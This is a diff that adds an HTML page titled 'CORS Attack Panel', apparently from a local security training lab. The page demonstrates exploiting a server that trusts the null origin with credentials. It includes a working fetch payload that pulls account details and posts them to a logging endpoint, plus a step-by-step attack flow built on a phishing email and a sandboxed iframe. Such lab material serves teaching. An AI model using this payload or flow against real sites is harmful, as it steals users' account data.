@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Attack Panel</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+        }
+
+        .header {
+            background: #202124;
+            color: white;
+            padding: 18px 30px;
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .container {
+            width: 900px;
+            max-width: calc(100% - 40px);
+            margin: 30px auto;
+        }
+
+        .card {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            margin-top: 0;
+        }
+
+        .label {
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        input,
+        textarea {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-family: Consolas, monospace;
+        }
+
+        textarea {
+            min-height: 260px;
+            resize: vertical;
+        }
+
+        .finding {
+            background: #fff3cd;
+            border: 1px solid #ffe69c;
+            padding: 15px;
+            border-radius: 5px;
+            line-height: 1.7;
+        }
+
+        .success {
+            background: #d1e7dd;
+            border: 1px solid #a3cfbb;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+            white-space: pre-wrap;
+        }
+
+        button {
+            margin-top: 15px;
+            padding: 10px 18px;
+            border: 0;
+            border-radius: 5px;
+            cursor: pointer;
+            color: white;
+            background: #1a73e8;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        .danger {
+            background: #d93025;
+        }
+
+        .link {
+            display: inline-block;
+            margin-top: 15px;
+            text-decoration: none;
+            color: #1a73e8;
+        }
+
+        code {
+            background: #eee;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        CORS Attack Panel
+    </div>
+
+    <div class="container">
+
+        <!-- TARGET -->
+
+        <div class="card">
+
+            <h2>1. Target</h2>
+
+            <div class="label">
+                Vulnerable API
+            </div>
+
+            <input
+                value="http://localhost:3000/api/accountDetails"
+                readonly
+            >
+
+        </div>
+
+
+        <!-- CORS FINDING -->
+
+        <div class="card">
+
+            <h2>2. CORS Finding</h2>
+
+            <div class="finding">
+
+                <strong>Origin tested:</strong>
+                <code>null</code>
+
+                <br>
+
+                <strong>Server response:</strong>
+                <br>
+
+                Access-Control-Allow-Origin:
+                <code>null</code>
+
+                <br>
+
+                Access-Control-Allow-Credentials:
+                <code>true</code>
+
+                <br><br>
+
+                <strong>Finding:</strong>
+                The server trusts the null origin.
+
+            </div>
+
+        </div>
+
+
+        <!-- PAYLOAD -->
+
+        <div class="card">
+
+            <h2>3. Payload</h2>
+
+            <p>
+                Payload used by the attacker to request
+                the account API from a sandboxed context.
+            </p>
+
+            <textarea id="payload">fetch(
+    "http://localhost:3000/api/accountDetails",
+    {
+        credentials: "include"
+    }
+)
+.then(response => response.json())
+.then(data => {
+    console.log("[+] Victim data:", data);
+
+    fetch("/log", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    });
+})
+.catch(error => {
+    console.error("[!] Error:", error);
+});</textarea>
+
+            <button onclick="testPayload()">
+                Test Payload
+            </button>
+
+            <div
+                id="result"
+                class="success"
+            ></div>
+
+        </div>
+
+
+        <!-- ATTACK FLOW -->
+
+        <div class="card">
+
+            <h2>4. Attack Flow</h2>
+
+            <ol>
+                <li>Identify that <code>null</code> is trusted.</li>
+                <li>Create the malicious payload.</li>
+                <li>Place the payload in <code>malicious.html</code>.</li>
+                <li>Send the fake email containing the malicious link.</li>
+                <li>Victim opens the link while logged in.</li>
+                <li>The sandboxed iframe generates <code>Origin: null</code>.</li>
+                <li>The vulnerable API processes the request.</li>
+                <li>The result is sent to the attacker server.</li>
+            </ol>
+
+        </div>
+
+
+        <!-- LINKS -->
+
+        <div class="card">
+
+            <h2>5. Lab Pages</h2>
+
+            <a
+                class="link"
+                href="/mail.html"
+            >
+                → Open Fake Mail
+            </a>
+
+            <br>
+
+            <a
+                class="link"
+                href="/malicious.html"
+            >
+                → Open Malicious Page
+            </a>
+
+        </div>
+
+    </div>
+
+
+<script>
+
+function testPayload() {
+
+    const result =
+        document.getElementById("result");
+
+    result.style.display = "block";
+
+    result.textContent =
+        "[*] Payload is ready.\n" +
+        "[*] Use malicious.html to execute it " +
+        "from the sandboxed Origin: null context.";
+
+}
+
+</script>
+
+</body>
+
+</html>
